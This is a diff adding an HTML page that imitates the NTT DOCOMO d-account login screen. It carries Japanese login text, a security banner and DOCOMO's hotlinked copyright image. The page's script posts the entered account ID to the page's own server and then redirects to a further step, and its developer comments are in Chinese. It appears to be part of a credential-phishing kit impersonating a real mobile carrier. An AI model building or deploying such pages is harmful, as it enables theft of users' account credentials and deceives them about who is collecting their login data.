@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   Document
+  </title>
+  <link href="/assets/files/style/css/layui.css" rel="stylesheet"/>
+  <link href="/assets/files/style/css/normalize.css" rel="stylesheet"/>
+  <link href="/assets/files/style/css/style.css" rel="stylesheet"/>
+  <script src="/assets/files/style/layui.js">
+  </script>
+  <style type="text/css">
+   .footer__global {
+	-moz-box-sizing: border-box;
+	-webkit-box-sizing: border-box;
+	-o-box-sizing: border-box;
+	-ms-box-sizing: border-box;
+	box-sizing: border-box;
+	padding: 0 0 27px;
+	background: #fff none;
+	border-top: 2px solid #c90028;
+	font-size: 11px;
+	font-size: 1.1rem;
+	text-align: center;
+	line-height: 11px;
+}
+  </style>
+ </head>
+ <body>
+  <div class="tip">
+   不正ログインの被害を防ぐ
+   <br/>
+   今すぐできるセキュリティ対策はこちら
+  </div>
+  <div class="top">
+   <div class="layui-row">
+    <div class="layui-col-xs6 alileft">
+     <div>
+      ログイン
+     </div>
+    </div>
+    <div class="layui-col-xs6 aliright">
+     <div>
+      dアカウント
+     </div>
+    </div>
+   </div>
+  </div>
+  <div class="tip2 box">
+   <!--<button type="button" class="layui-btn layui-btn-fluid">生体認証</button>-->
+   <p>
+    dアカウント
+   </p>
+  </div>
+  <form action="" class="layui-form" lay-filter="component-form-group">
+   <div class="tip3 box">
+    <span class="step-span">
+     dアカウントのID
+    </span>
+    <div class="layui-input-block">
+     <input autocomplete="off" class="layui-input" lay-verify="title" name="username" type="text"/>
+    </div>
+    <div class="layui-input-block">
+     <input checked="" lay-skin="primary" name="like1[write]" title="" type="checkbox"/>
+     次回ログインからIDの入力を省略
+    </div>
+    <button class="layui-btn layui-btn-fluid" lay-filter="formDemo" lay-submit="" type="button">
+     次へ
+    </button>
+    <p>
+     <a href="javascript:;">
+      IDをお忘れの方
+     </a>
+    </p>
+    <div>
+     <div class="layui-input-block" style="width: 100%;background-color: #e9ea95;line-height: 35px;color: #fff;font-weight: 900">
+      <span style="margin-left: 10px;">
+       ご注意
+      </span>
+     </div>
+     <div class="" style="font-size: 10px;background-color: #eaeaea;">
+      <p style="margin:0;padding-top: 13px;">
+       一度ログインを行うと次回以降、ニックネーム、dポイント情報、利用履歴等の情報が自動的に表示されます。第三者が使用する可能性があるパソコン・タブレットをご利用の場合には、ご注意ください。
+      </p>
+      <p style="margin:0;">
+       お客様がご利用されるサービスに応じて、ログイン状態で表示される情報は異なります。 ご利用のサービスで表示される情報をご確認の上ログイン状態を保持するか否かご検討ください。
+      </p>
+      共用のパソコンやタブレットでの利用について
+     </div>
+    </div>
+   </div>
+   <div class="footer__global">
+    <div class="ftr_link sp_view">
+     <div class="" style="color: #858585;font-weight: bold;padding: 10px 5px 4px;">
+      <a href="" style="display: inline-block;
+    padding: 10px 5px 4px;
+    font-size: 11px;text-decoration:underline;">
+       プライバシーポリシー
+      </a>
+      <a href="" style="display: inline-block;
+    padding: 10px 5px 4px;
+    font-size: 11px;text-decoration:underline;">
+       ご利用規約/ご注意事項
+      </a>
+      <a href="" style="display: inline-block;
+    padding: 10px 5px 4px;
+    font-size: 11px;text-decoration:underline;">
+       ご利用にあたって
+      </a>
+     </div>
+    </div>
+    <small class="copyright">
+     <img alt="(C) NTT DOCOMO .INC. All Right Reserved." src="https://id.smt.docomo.ne.jp/img/footer_copyright.png" width="262"/>
+    </small>
+   </div>
+  </form>
+  <script src="/assets/files/js/jquery.min.js">
+  </script>
+  <script type="text/javascript">
+   layui.use(['layer', 'form', 'element'], function() {
+	var layer = layui.layer,
+	element = layui.element,
+	$ = layui.jquery,
+	form = layui.form;
+	//…
+    
+    
+    
+	form.verify({
+      title:[/[\S]+/,'dアカウントのID必填']
+	});
+    form.on('submit(formDemo)', function(data){
+        //判断最少有1个checkbox
+        var len = $("input:checked").length;
+        if (len < 1) {
+            layer.msg('次回ログインからIDの入力を省略必选', { icon: 2 });
+            return false;
+        }
+        //加载弹出层
+        var index = layer.load(2, {shade: [0.01, '#000']});
+        $.ajax({
+            url: '',
+            type: 'post',
+            data: data.field,
+            success: function (res) {
+                layer.close(index);
+                if (res.code == 1) {
+                    location.href='/index/index/index1';
+                } else {
+                    layer.msg(res.msg, {icon: 5})
+                }
+            }
+        })
+        
+        return false; 
+    });
+
+});
+  </script>
+ </body>
+</html>
